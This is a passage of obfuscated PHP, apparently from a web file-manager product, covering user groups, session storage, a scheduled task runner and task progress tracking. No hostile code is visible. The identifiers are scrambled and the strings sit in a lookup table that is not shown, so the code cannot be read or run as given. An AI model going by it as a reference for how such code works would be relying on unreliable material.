$¬Íö¿Ù; } private function userGroupList($°ŠÆ±‰É = false) { $úÇ¼Ş¯œ =& $_SERVER[ˆ¡¹µ‹Â]; static $•‡×Õó = array(); if (isset($•‡×Õó[$°ŠÆ±‰É])) { return $•‡×Õó[$°ŠÆ±‰É]; } $¤Ú©‹Ô = Model($úÇ¼Ş¯œ[598])->getInfo($°ŠÆ±‰É); $•‡×Õó[$°ŠÆ±‰É] = array_to_keyvalue($¤Ú©‹Ô[$úÇ¼Ş¯œ[2154]], $úÇ¼Ş¯œ[1962]); return $•‡×Õó[$°ŠÆ±‰É]; } public function userGroupParents($œ¼§ÒÏ) { $ù±”²£³ =& $_SERVER[ˆ¡¹µ‹Â]; static $ëÔ‹Ã›´ = array(); $œ¼§ÒÏ = $œ¼§ÒÏ ? $œ¼§ÒÏ : USER_ID; if (isset($ëÔ‹Ã›´[$œ¼§ÒÏ])) { return $ëÔ‹Ã›´[$œ¼§ÒÏ]; } $á÷Á§Ç½ = $this->userGroupList($œ¼§ÒÏ); $è·»Â›³ = array(); $âÎ€Ã²Ï = $GLOBALS[$ù±”²£³[6]][$ù±”²£³[92]][$ù±”²£³[2069]] == 1; $¥ÓÅ¡åè = $âÎ€Ã²Ï ? 3 : 2; foreach ($á÷Á§Ç½ as $Á€ô¡¨Ø) { $şøÄ®•é = array($Á€ô¡¨Ø[$ù±”²£³[1962]]); $–®ÀÜ­ = explode($ù±”²£³[50], trim($Á€ô¡¨Ø[$ù±”²£³[584]], $ù±”²£³[50])); if ($–®ÀÜ­[0] == $ù±”²£³[228] && count($–®ÀÜ­) > $¥ÓÅ¡åè) { $·”õ„á› = array_slice($–®ÀÜ­, $¥ÓÅ¡åè); $şøÄ®•é = array_merge($şøÄ®•é, array_reverse($·”õ„á›)); } $è·»Â›³ = array_merge($è·»Â›³, $şøÄ®•é); } $ëÔ‹Ã›´[$œ¼§ÒÏ] = array_unique($è·»Â›³); return $ëÔ‹Ã›´[$œ¼§ÒÏ]; } public function authTargetInfoMake($ÌâŠ”ÍÅ) { $Œ”İ¶¿« =& $_SERVER[ˆ¡¹µ‹Â]; $Ä£òÏãæ = array(); $«Âı£ø = array(); foreach ($ÌâŠ”ÍÅ as $Ô×¾®Ş”) { if ($Ô×¾®Ş”[$Œ”İ¶¿«[190]] == SourceModel::TYPE_USER) { $Ä£òÏãæ[] = intval($Ô×¾®Ş”[$Œ”İ¶¿«[569]]); } else { if ($Ô×¾®Ş”[$Œ”İ¶¿«[190]] == SourceModel::TYPE_GROUP) { $«Âı£ø[] = intval($Ô×¾®Ş”[$Œ”İ¶¿«[569]]); } } } if ($Ä£òÏãæ) { $Ä£òÏãæ = Model($Œ”İ¶¿«[577])->userListInfo($Ä£òÏãæ); } if ($«Âı£ø) { $òÒ…´°¶ = array($Œ”İ¶¿«[2054] => array($Œ”İ¶¿«[492], $«Âı£ø)); $«Âı£ø = Model($Œ”İ¶¿«[585])->field($Œ”İ¶¿«[2184])->where($òÒ…´°¶)->select(); $«Âı£ø = array_to_keyvalue($«Âı£ø, $Œ”İ¶¿«[1962]); } return array($Œ”İ¶¿«[2185] => $Ä£òÏãæ, $Œ”İ¶¿«[2186] => $«Âı£ø); } public function authInfo($àÓÖŸ¹­) { $‹ˆîŒıä =& $_SERVER[ˆ¡¹µ‹Â]; if ($àÓÖŸ¹­[$‹ˆîŒıä[2070]]) { $´ñ¦ö“î = Model($‹ˆîŒıä[571])->listData($àÓÖŸ¹­[$‹ˆîŒıä[2070]]); if (!$´ñ¦ö“î) { return !1; $ÙÔ™÷Ü­ = Model($‹ˆîŒıä[571])->listData(); $”¦œ¹‹ = array_filter_by_field($ÙÔ™÷Ü­, $‹ˆîŒıä[487], $‹ˆîŒıä[228]); return $”¦œ¹‹; } $Ä•·‰Š = array_field_key($´ñ¦ö“î, array($‹ˆîŒıä[475], $‹ˆîŒıä[32], $‹ˆîŒıä[487], $‹ˆîŒıä[1985], $‹ˆîŒıä[1986])); $Ä•·‰Š[$‹ˆîŒıä[2187]] = $àÓÖŸ¹­; return $Ä•·‰Š; } else { return array($‹ˆîŒıä[493] => 0, $‹ˆîŒıä[1968] => $àÓÖŸ¹­[$‹ˆîŒıä[2131]], $‹ˆîŒıä[494] => $‹ˆîŒıä[12], $‹ˆîŒıä[1985] => $‹ˆîŒıä[2188]); } } } goto cßòìÀù…; DÓ–ì±ˆµ—: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $­×Šäî =& $_SERVER[ˆ¡¹µ‹Â]; static $Îı´ûÉ = false; if ($Îı´ûÉ) { return $Îı´ûÉ; } $³ä¼Ç±Õ = $GLOBALS[$­×Šäî[6]][$­×Šäî[425]]; self::$sessionTime = $³ä¼Ç±Õ[$­×Šäî[1709]]; $üğè‘ş¨ = isset($GLOBALS[$­×Šäî[1710]]) ? $GLOBALS[$­×Šäî[1710]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($üğè‘ş¨)) { self::$sessionSign = Cookie::get($üğè‘ş¨); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($üğè‘ş¨, self::$sessionSign, self::$sessionTime); $³š¬‡Ç = $³ä¼Ç±Õ[$­×Šäî[1711]]; $†©±‹Éí = $³ä¼Ç±Õ[$³š¬‡Ç]; $âÊÚ ç = $³ä¼Ç±Õ[$­×Šäî[902]]; switch ($³š¬‡Ç) { case $­×Šäî[21]: self::$handle = Model($­×Šäî[903]); break; case $­×Šäî[904]: self::$handle = new CacheRedis($†©±‹Éí, $âÊÚ ç); break; case $­×Šäî[905]: self::$handle = new CacheMemcached($†©±‹Éí, $âÊÚ ç); break; case $­×Šäî[230]: $†©±‹Éí[$­×Šäî[87]] = $†©±‹Éí[$­×Šäî[87]] . $­×Šäî[1712]; self::$handle = new CacheFile($†©±‹Éí, $âÊÚ ç); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Îı´ûÉ = new self(); return $Îı´ûÉ; } public static function getBySign($ÃÃÅ») { $½À”È•€ = self::$handle->get($ÃÃÅ»); $½À”È•€ = unserialize($½À”È•€); return is_array($½À”È•€) ? $½À”È•€ : array(); } public static function setBySign($Åá‡åÕ‹, $¼ˆ³ëÇš) { CacheLock::lock($Åá‡åÕ‹); self::$handle->set($Åá‡åÕ‹, serialize($¼ˆ³ëÇš), self::$sessionTime); CacheLock::unlock($Åá‡åÕ‹); } public static function sign($”Ë”ª£í = false) { if ($”Ë”ª£í) { self::$sessionSign = $”Ë”ª£í; } self::init(); return self::$sessionSign; } public static function set($ŸƒÚ¸¾…, $ÉÒ¼›¦ô = false) { self::init(); if (is_array($ŸƒÚ¸¾…)) { foreach ($ŸƒÚ¸¾… as $íÉ¶°´“ => $³üñÖ¤µ) { array_set_value(self::$data, $íÉ¶°´“, $³üñÖ¤µ); } } else { array_set_value(self::$data, $ŸƒÚ¸¾…, $ÉÒ¼›¦ô); } self::setBySign(self::$sessionSign, self::$data); } public static function get($…´±ïá = false) { self::init(); if (!$…´±ïá) { return self::$data; } return array_get_value(self::$data, $…´±ïá); } public static function remove($”È§ö™Á) { self::init(); unset(self::$data[$”È§ö™Á]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ˆ¡¹µ‹Â][908])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÀË»û =& $_SERVER[ˆ¡¹µ‹Â]; if (self::valueGet($ÀË»û[817]) != $ÀË»û[91]) { return; } if (self::valueGet($ÀË»û[1713]) == $ÀË»û[91]) { $ºûäÒÒ = self::valueGet($ÀË»û[1714]); if (time() - $ºûäÒÒ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÀË»û[1713], $ÀË»û[91]); self::log($ÀË»û[1715] . ACTION . $ÀË»û[1716]); Hook::bind($ÀË»û[1717], $ÀË»û[1718]); $¾ŒÉÒÖ» = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÀË»û[817]) != $ÀË»û[91]) { self::valueSet($ÀË»û[1713], $ÀË»û[228]); self::log($ÀË»û[1719]); die; } $î¨¢Õûµ = time(); if ($î¨¢Õûµ - $¾ŒÉÒÖ» >= 60) { self::valueSet(array($ÀË»û[1713] => $ÀË»û[91], $ÀË»û[1714] => $î¨¢Õûµ)); $¾ŒÉÒÖ» = $î¨¢Õûµ; } if (!file_exists(USER_SYSTEM . $ÀË»û[1720])) { self::valueSet(array($ÀË»û[1713] => $ÀË»û[228], $ÀË»û[817] => $ÀË»û[228])); self::log($ÀË»û[1721]); die; } $¯œ“Ì£² = file_get_contents(BASIC_PATH . $ÀË»û[1722]); $’ãÏÚ…ê = KOD_VERSION . $ÀË»û[10] . KOD_VERSION_BUILD; $²« Ÿ¶ã = match_text($¯œ“Ì£², $ÀË»û[1723]) . $ÀË»û[10] . match_text($¯œ“Ì£², $ÀË»û[1724]); if ($²« Ÿ¶ã != $’ãÏÚ…ê) { self::restart(); self::log("\x73\x74\x6f\160\145\x64\56\x5b\x76\145\162\163\x69\x6f\156\x20\165\160\144\x61\164\145\73{$versionNow}\40\75\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $­îçö‘ =& $_SERVER[ˆ¡¹µ‹Â]; http_close(); $GLOBALS[$­îçö‘[1725]] = 1; $_SERVER[$­îçö‘[1726]] = $­îçö‘[1727]; $_COOKIE = array(); $GLOBALS[$­îçö‘[1728]] = 1; $GLOBALS[$­îçö‘[1729]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $´—ˆ‹´ã =& $_SERVER[ˆ¡¹µ‹Â]; http_close(); self::valueSet($´—ˆ‹´ã[817], $´—ˆ‹´ã[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($´—ˆ‹´ã[1713] => $´—ˆ‹´ã[228], $´—ˆ‹´ã[817] => $´—ˆ‹´ã[91])); self::log($´—ˆ‹´ã[1730]); } public static function taskSwitch() { $·Ÿó¼’à =& $_SERVER[ˆ¡¹µ‹Â]; $ÛÎÍú¤­ = self::valueGet($·Ÿó¼’à[817]) == $·Ÿó¼’à[91] ? $·Ÿó¼’à[228] : $·Ÿó¼’à[91]; self::valueSet($·Ÿó¼’à[817], $ÛÎÍú¤­); } public static function shutdownEvent() { $‰í»÷Æš =& $_SERVER[ˆ¡¹µ‹Â]; self::valueSet($‰í»÷Æš[1713], $‰í»÷Æš[228]); self::log($‰í»÷Æš[1731]); } public static function config($Æ¬÷Ïñó, $Ş§ªü–») { self::valueSet($_SERVER[ˆ¡¹µ‹Â][817], $Æ¬÷Ïñó); } private static function taskRunAll() { $¤¢Å•î¿ =& $_SERVER[ˆ¡¹µ‹Â]; $Ñ¡êÈ£œ = timeFloat(); $´‰ĞÒ¥• = Model($¤¢Å•î¿[1732])->listData(); $¡®¥î²› = count($´‰ĞÒ¥•); for ($È§×ç¡¬ = 0; $È§×ç¡¬ < $¡®¥î²›; $È§×ç¡¬++) { $ÍÇîÅåŠ = $´‰ĞÒ¥•[$È§×ç¡¬]; if (!$ÍÇîÅåŠ[$¤¢Å•î¿[475]] || $ÍÇîÅåŠ[$¤¢Å•î¿[1733]] != $¤¢Å•î¿[91]) { continue; } if (!self::taskTimeCheck($ÍÇîÅåŠ)) { continue; } self::taskRun($ÍÇîÅåŠ); } Hook::trigger($¤¢Å•î¿[1734]); self::taskQueueRun($Ñ¡êÈ£œ); } private static function taskQueueRun($¡ùª¡È) { $µÏíÜúï = 10; while (!0) { $Ã¨İŠî¿ = TaskQueue::run(); if ($Ã¨İŠî¿ === !1) { break; } if (timeFloat() - $¡ùª¡È >= $µÏíÜúï) { break; } } } private static function taskTimeCheck($²ô…ìÚÙ) { $©£çû½õ =& $_SERVER[ˆ¡¹µ‹Â]; $ë•ª¡’Ú = json_decode($²ô…ìÚÙ[$©£çû½õ[206]], !0); $û†Áğõ = intval($²ô…ìÚÙ[$©£çû½õ[1714]]); $­ê²ò¶ = strtotime($©£çû½õ[1735] . $ë•ª¡’Ú[$©£çû½õ[1736]] . $©£çû½õ[1737]) - strtotime($©£çû½õ[1738]); $Àšö¡Ã° = time() - strtotime(date($©£çû½õ[1739]) . $©£çû½õ[1740]); $ˆ§ê“› = $Àšö¡Ã° >= $­ê²ò¶ && $Àšö¡Ã° <= $­ê²ò¶ + 3600; switch ($ë•ª¡’Ú[$©£çû½õ[33]]) { case $©£çû½õ[1741]: if (time() - $û†Áğõ < 3600 * 24 * 30) { return !1; } if ($ë•ª¡’Ú[$©£çû½õ[1741]] == date($©£çû½õ[1742]) && $ˆ§ê“›) { return !0; } break; case $©£çû½õ[1743]: if (time() - $û†Áğõ < 3600 * 24 * 7) { return !1; } $¹‡ÀˆŒÕ = date($©£çû½õ[1744]) == 0 ? 7 : date($©£çû½õ[1744]); if ($ë•ª¡’Ú[$©£çû½õ[1743]] == $¹‡ÀˆŒÕ && $ˆ§ê“›) { return !0; } break; case $©£çû½õ[1736]: if (time() - $û†Áğõ < 3600 * 24) { return !1; } if ($ˆ§ê“›) { return !0; } break; case $©£çû½õ[1745]: if (time() - $û†Áğõ >= floatval($ë•ª¡’Ú[$©£çû½õ[1745]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ìí½Œ³® =& $_SERVER[ˆ¡¹µ‹Â]; static $ºø”ŒäÎ = 0; $ÑĞÚ­ç = 300; if (!$ºø”ŒäÎ) { $ºø”ŒäÎ = time(); } if (time() - $ºø”ŒäÎ < $ÑĞÚ­ç) { return; } $ºø”ŒäÎ = time(); $Ôç‹›æË = Model($ìí½Œ³®[577])->db($ìí½Œ³®[12]); if ($Ôç‹›æË) { $Ôç‹›æË->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ìí½Œ³®[1746], $ìí½Œ³®[1747]); die; } } public static function taskRun($Êñ©‚í„) { $¿—¹­¨ =& $_SERVER[ˆ¡¹µ‹Â]; self::log($¿—¹­¨[1748] . $Êñ©‚í„[$¿—¹­¨[475]] . $¿—¹­¨[1749] . $Êñ©‚í„[$¿—¹­¨[32]] . $¿—¹­¨[1750] . $Êñ©‚í„[$¿—¹­¨[1751]]); Model($¿—¹­¨[1732])->run($Êñ©‚í„[$¿—¹­¨[475]]); $ŠÀ«¨Œ = timeFloat(); $œó…ÈÓ = $¿—¹­¨[12]; switch ($Êñ©‚í„[$¿—¹­¨[33]]) { case $¿—¹­¨[383]: $ºŸñ†¡ñ = url_request($Êñ©‚í„[$¿—¹­¨[1751]], $¿—¹­¨[261], !1, !1, !1, !1, 10); if ($ºŸñ†¡ñ[$¿—¹­¨[817]]) { $œó…ÈÓ = strlen($ºŸñ†¡ñ[$¿—¹­¨[1280]]); } break; case $¿—¹­¨[260]: $œó…ÈÓ = Hook::apply($Êñ©‚í„[$¿—¹­¨[1751]]); default: break; } Model($¿—¹­¨[1752])->add(array($¿—¹­¨[1753] => $¿—¹­¨[12], $¿—¹­¨[1754] => $¿—¹­¨[228], $¿—¹­¨[33] => $¿—¹­¨[1755] . $Êñ©‚í„[$¿—¹­¨[475]], $¿—¹­¨[1756] => json_encode(array($¿—¹­¨[32] => $Êñ©‚í„[$¿—¹­¨[32]], $¿—¹­¨[1757] => timeFloat() - $ŠÀ«¨Œ, $¿—¹­¨[369] => $œó…ÈÓ)))); $½¦˜Úœ = $œó…ÈÓ ? $¿—¹­¨[1758] . $œó…ÈÓ : $¿—¹­¨[12]; self::log($¿—¹­¨[1759] . $Êñ©‚í„[$¿—¹­¨[475]] . $¿—¹­¨[178] . $½¦˜Úœ); return !0; } public static function valueGet($“Ì“ıÔ€) { $üˆ¬ê‰ =& $_SERVER[ˆ¡¹µ‹Â]; $‡ò–Â¨ = $üˆ¬ê‰[1760]; $€ıã©“ƒ = Model($üˆ¬ê‰[508])->get($“Ì“ıÔ€, $‡ò–Â¨); if (is_null($€ıã©“ƒ)) { Model($üˆ¬ê‰[508])->set($üˆ¬ê‰[817], $üˆ¬ê‰[91], $‡ò–Â¨); Model($üˆ¬ê‰[508])->set($üˆ¬ê‰[1713], $üˆ¬ê‰[228], $‡ò–Â¨); $€ıã©“ƒ = Model($üˆ¬ê‰[508])->get($“Ì“ıÔ€, $‡ò–Â¨); } return $€ıã©“ƒ; } private static function valueSet($åü”ÌÜÍ, $ÃºÊÉ³„ = false) { $²ûÏ§®ü =& $_SERVER[ˆ¡¹µ‹Â]; $ÜÖ‡Åàñ = $²ûÏ§®ü[1761]; CacheLock::lock($ÜÖ‡Åàñ); $ºö¯å³¢ = Model($²ûÏ§®ü[508])->set($åü”ÌÜÍ, $ÃºÊÉ³„, $²ûÏ§®ü[1760]); CacheLock::unlock($ÜÖ‡Åàñ); return $ºö¯å³¢; } protected static function log($•“Â ú) { write_log($•“Â ú, $_SERVER[ˆ¡¹µ‹Â][1747]); } private static function cacheClear() { $¿ÛÍ‡Øú =& $_SERVER[ˆ¡¹µ‹Â]; Cache::clearMemory(Model($¿ÛÍ‡Øú[508])->cacheKey($¿ÛÍ‡Øú[1760])); Cache::clearMemory(Model($¿ÛÍ‡Øú[508])->cacheKey($¿ÛÍ‡Øú[1762])); Model($¿ÛÍ‡Øú[1732])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($˜º»–Ä¡, $ Ç«Ë“  = '', $¦«ó­•œ = 0, $¹¶êÀîƒ = '') { $µÙÚÛÁÃ =& $_SERVER[ˆ¡¹µ‹Â]; if (self::get($˜º»–Ä¡)) { return; } $this->task = array($µÙÚÛÁÃ[475] => $˜º»–Ä¡, $µÙÚÛÁÃ[1763] => USER_ID, $µÙÚÛÁÃ[1652] => $¹¶êÀîƒ, $µÙÚÛÁÃ[526] => $µÙÚÛÁÃ[12], $µÙÚÛÁÃ[33] => $ Ç«Ë“ , $µÙÚÛÁÃ[1136] => $µÙÚÛÁÃ[12], $µÙÚÛÁÃ[1134] => $¦«ó­•œ, $µÙÚÛÁÃ[1764] => 0, $µÙÚÛÁÃ[1765] => 0, $µÙÚÛÁÃ[1766] => 0, $µÙÚÛÁÃ[1767] => timeFloat(), $µÙÚÛÁÃ[1768] => 0, $µÙÚÛÁÃ[1769] => 0, $µÙÚÛÁÃ[1770] => 0, $µÙÚÛÁÃ[1771] => 0, $µÙÚÛÁÃ[817] => $µÙÚÛÁÃ[1713]); $GLOBALS[$µÙÚÛÁÃ[1772]] = 1; Hook::bind($µÙÚÛÁÃ[1717], array($this, $µÙÚÛÁÃ[1773])); Hook::bind($µÙÚÛÁÃ[1774], array($this, $µÙÚÛÁÃ[1775])); $this->startAfter(); Hook::trigger($µÙÚÛÁÃ[1776], $this->task); $this->task[$µÙÚÛÁÃ[1769]] = timeFloat(); } public function end($¶•”³µ = '') { $ùÅû­óà =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ùÅû­óà[1769]]) { self::valueSet($this->task[$ùÅû­óà[475]], !1); } $this->isEnd = !0; if ($¶•”³µ) { $this->task[$ùÅû­óà[526]] = $¶•”³µ; } self::log($ùÅû­óà[1777] . $this->task[$ùÅû­óà[475]] . $ùÅû­óà[1778] . sprintf($ùÅû­óà[925], timeFloat() - $this->task[$ùÅû­óà[1767]]) . $ùÅû­óà[1779]); Hook::unbind($ùÅû­óà[1717], array($this, $ùÅû­óà[1773])); Hook::unbind($ùÅû­óà[1774], array($this, $ùÅû­óà[1775])); $this->endAfter(); $èüµšô = $this->task; $this->task = !1; Hook::trigger($ùÅû­óà[1780], $èüµšô); } public function update($åÏ—ˆ—Â = 0, $®«„ŒíÅ = false) { $ôŒ§ßŒß =& $_SERVER[ˆ¡¹µ‹Â]; $ÆûÙâ¦ô =& $this->task; if (!$ÆûÙâ¦ô) { return; } $ÆûÙâ¦ô[$ôŒ§ßŒß[1764]] += $åÏ—ˆ—Â; $ÆûÙâ¦ô[$ôŒ§ßŒß[1768]] = timeFloat(); if ($ÆûÙâ¦ô[$ôŒ§ßŒß[1134]]) { if ($ÆûÙâ¦ô[$ôŒ§ßŒß[1134]] < $ÆûÙâ¦ô[$ôŒ§ßŒß[1764]]) { $ÆûÙâ¦ô[$ôŒ§ßŒß[1134]] = $ÆûÙâ¦ô[$ôŒ§ßŒß[1764]]; } $­õ‘šíì = timeFloat() - $ÆûÙâ¦ô[$ôŒ§ßŒß[1767]] - $ÆûÙâ¦ô[$ôŒ§ßŒß[1770]]; if ($­õ‘šíì <= 0) { $­õ‘šíì = 0.001; } $ÆûÙâ¦ô[$ôŒ§ßŒß[1765]] = $ÆûÙâ¦ô[$ôŒ§ßŒß[1764]] / $ÆûÙâ¦ô[$ôŒ§ßŒß[1134]]; $ÆûÙâ¦ô[$ôŒ§ßŒß[1766]] = $ÆûÙâ¦ô[$ôŒ§ßŒß[1764]] / $­õ‘šíì; if ($ÆûÙâ¦ô[$ôŒ§ßŒß[1765]] > 0) { $ÆûÙâ¦ô[$ôŒ§ßŒß[1771]] = $­õ‘šíì * (1 - $ÆûÙâ¦ô[$ôŒ§ßŒß[1765]]) / $ÆûÙâ¦ô[$ôŒ§ßŒß[1765]]; } $ÆûÙâ¦ô[$ôŒ§ßŒß[1771]] = $ÆûÙâ¦ô[$ôŒ§ßŒß[1771]] <= 0 ? 0 : $ÆûÙâ¦ô[$ôŒ§ßŒß[1771]]; } $this->updateAfter(); $®Òï€×‰ = 0.2; if (timeFloat() - $ÆûÙâ¦ô[$ôŒ§ßŒß[1769]] < $®Òï€×‰ && !$®«„ŒíÅ) { return; } $šùìç¸ƒ = self::get($ÆûÙâ¦ô[$ôŒ§ßŒß[475]]); $¨’íä Ö = $šùìç¸ƒ[$ôŒ§ßŒß[817]]; if ($¨’íä Ö == self::STATYS_KILL) { $Ü®Ûˆ = array($ôŒ§ßŒß[1781] => LNG($ôŒ§ßŒß[1782]), $ôŒ§ßŒß[1290] => !1); Cache::set($ôŒ§ßŒß[1783] . $this->task[$ôŒ§ßŒß[475]], $Ü®Ûˆ, 30); $this->onKill(); $this->end(); die; } else { if ($¨’íä Ö == self::STATYS_STOP) { $ÜãÚÄ©¡ = 2; $šùìç¸ƒ[$ôŒ§ßŒß[1770]] += $ÜãÚÄ©¡; self::valueSet($ÆûÙâ¦ô[$ôŒ§ßŒß[475]], $šùìç¸ƒ); sleep($ÜãÚÄ©¡); $this->update(); return; } } $ÆûÙâ¦ô[$ôŒ§ßŒß[817]] = $¨’íä Ö ? $¨’íä Ö : $ÆûÙâ¦ô[$ôŒ§ßŒß[817]]; $ÆûÙâ¦ô[$ôŒ§ßŒß[1770]] = $šùìç¸ƒ[$ôŒ§ßŒß[1770]] ? $šùìç¸ƒ[$ôŒ§ßŒß[1770]] : 0; $ÆûÙâ¦ô[$ôŒ§ßŒß[1769]] = timeFloat(); Hook::trigger($ôŒ§ßŒß[1784], $ÆûÙâ¦ô); self::valueSet($ÆûÙâ¦ô[$ôŒ§ßŒß[475]], $ÆûÙâ¦ô); } public function onKillSet($×€ğàĞ„, $„”£¢û· = array()) { $this->onKillCall = array($×€ğàĞ„, $„”£¢û·); } public function onKill() { $ñÜÃÌ›Ñ =& $_SERVER[ˆ¡¹µ‹Â]; self::log($ñÜÃÌ›Ñ[1777] . $this->task[$ñÜÃÌ›Ñ[475]] . $ñÜÃÌ›Ñ[1785]); Hook::trigger($ñÜÃÌ›Ñ[1786], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Îç¶¦˜Ù) { $âÄ¶ÚÆ =& $_SERVER[ˆ¡¹µ‹Â]; Cache::set($âÄ¶ÚÆ[1783] . $this->task[$âÄ¶ÚÆ[475]], $Îç¶¦˜Ù, 60); return $Îç¶¦˜Ù; } public static function get($‹û•ûùı) { $‚ê¿Ó§ =& $_SERVER[ˆ¡¹µ‹Â]; $÷É½íå¶ = self::valueGet($‹û•ûùı); if (is_array($÷É½íå¶) && $÷É½íå¶[$‚ê¿Ó§[1787]]) { $ÛßØóÆÔ = ActionApply($÷É½íå¶[$‚ê¿Ó§[1787]], array($÷É½íå¶)); $÷É½íå¶ = is_array($ÛßØóÆÔ) ? $ÛßØóÆÔ : $÷É½íå¶; } return $÷É½íå¶; } public static function listData() { $ºİ’‹  = self::valueGet(); return array_sort_by($ºİ’‹ , $_SERVER[ˆ¡¹µ‹Â][1767], !0); } public static function kill($Ü™‹ı’µ) { return self::changeStatus($Ü™‹ı’µ, self::STATYS_KILL); } public static function stop($ª„™§µ) { return self::changeStatus($ª„™§µ, self::STATYS_STOP); } public static function restart($Ğ…¯º„ì) { return self::changeStatus($Ğ…¯º„ì, self::STATYS_RUNNING); } public static function killAll() { $¬ë×ìùÍ =& $_SERVER[ˆ¡¹µ‹Â]; $èï€Ô™Ÿ = self::listData(); foreach ($èï€Ô™Ÿ as $íñ›õÖÒ) { self::kill($íñ›õÖÒ[$¬ë×ìùÍ[475]]); } sleep(2); foreach ($èï€Ô™Ÿ as $íñ›õÖÒ) { self::valueSet($íñ›õÖÒ[$¬ë×ìùÍ[475]], !1); } } private static function changeStatus($ÃææÁÚ¬, $ô´º«Ü–) { $‰²è°µ® =& $_SERVER[ˆ¡¹µ‹Â]; $°¦Àææ‚ = self::valueGet($ÃææÁÚ¬); if (!$°¦Àææ‚) { return !1; } $°¦Àææ‚[$‰²è°µ®[817]] = $ô´º«Ü–; self::valueSet($ÃææÁÚ¬, $°¦Àææ‚); self::log($‰²è°µ®[1788] . $°¦Àææ‚[$‰²è°µ®[475]] . $‰²è°µ®[1789] . $ô´º«Ü–); return !0; } public static function valueGet($¼÷¹©ø = false) { $ïïßå­ =& $_SERVER[ˆ¡¹µ‹Â]; if ($¼÷¹©ø) { $‹ˆ¤ÓÁ­ = Model($ïïßå­[520])->where(array($ïïßå­[97] => $¼÷¹©ø, $ïïßå­[33] => $ïïßå­[1143]))->find(); return $‹ˆ¤ÓÁ­ ? json_decode($‹ˆ¤ÓÁ­[$ïïßå­[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($İ§¿Ÿüé = false) { $˜ùëƒ‹Ò =& $_SERVER[ˆ¡¹µ‹Â]; $Ñ‰€ğå€ = array($˜ùëƒ‹Ò[33] => $˜ùëƒ‹Ò[1143]); if ($İ§¿Ÿüé) { $Ñ‰€ğå€[$˜ùëƒ‹Ò[1763]] = $İ§¿Ÿüé; } $Š‡î‡Î“ = Model($˜ùëƒ‹Ò[520])->where($Ñ‰€ğå€)->select(); $Š‡î‡Î“ = $Š‡î‡Î“ ? $Š‡î‡Î“ : array(); foreach ($Š‡î‡Î“ as $ÁÁÀÓ“ => $Î–ÌÊé–) { $Š‡î‡Î“[$ÁÁÀÓ“] = json_decode($Î–ÌÊé–[$˜ùëƒ‹Ò[450]], !0); } return $Š‡î‡Î“; } public static function valueSet($¨şÁÇä, $µ˜ó ãË) { $šÁãÃú =& $_SERVER[ˆ¡¹µ‹Â]; if (!$µ˜ó ãË) { return Model($šÁãÃú[520])->where(array($šÁãÃú[97] => $¨şÁÇä, $šÁãÃú[33] => $šÁãÃú[1143]))->delete(); } $¿Ü­„ïª = json_encode($µ˜ó ãË); if (!$¿Ü­„ïª) { ob_start(); var_dump($µ˜ó ãË); $ÉùúµÎ¬ = ob_get_clean(); self::log($šÁãÃú[1790] . json_encode_force($ÉùúµÎ¬)); } if (!$¨şÁÇä || !$µ˜ó ãË[$šÁãÃú[475]]) { return !1; } $®Âõõ¾Ë = array($šÁãÃú[33] => $šÁãÃú[1143], $šÁãÃú[1763] => USER_ID, $šÁãÃú[97] => $¨şÁÇä, $šÁãÃú[450] => $¿Ü­„ïª); $°„©ØŠõ = $šÁãÃú[1791]; CacheLock::lock($°„©ØŠõ); Model($šÁãÃú[520])->add($®Âõõ¾Ë, array(), !0); CacheLock::unlock($°„©ØŠõ); } public static function log($œÃŞ»ãµ) { if (!GLOBAL_DEBUG) { return; } write_log($œÃŞ»ãµ, $_SERVER[ˆ¡¹µ‹Â][1792]); } } goto E÷’„ï×éƒ; c½«ãç§êÛ: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\155\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\x69\x6d\145", "\164\151\x6d\145", "\x69\156\163\x65\162\x74", "\x66\x75\156\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $™ë¤İ‰É =& $_SERVER[ˆ¡¹µ‹Â]; return array($™ë¤İ‰É[2328] => LNG($™ë¤İ‰É[2329]), $™ë¤İ‰É[2330] => LNG($™ë¤İ‰É[2331]), $™ë¤İ‰É[1904] => LNG($™ë¤İ‰É[2332]), $™ë¤İ‰É[2333] => LNG($™ë¤İ‰É[2334]), $™ë¤İ‰É[2335] => LNG($™ë¤İ‰É[2336]), $™ë¤İ‰É[2337] => LNG($™ë¤İ‰É[2338]), $™ë¤İ‰É[2339] => LNG($™ë¤İ‰É[2340]), $™ë¤İ‰É[1934] => LNG($™ë¤İ‰É[2340]), $™ë¤İ‰É[1935] => 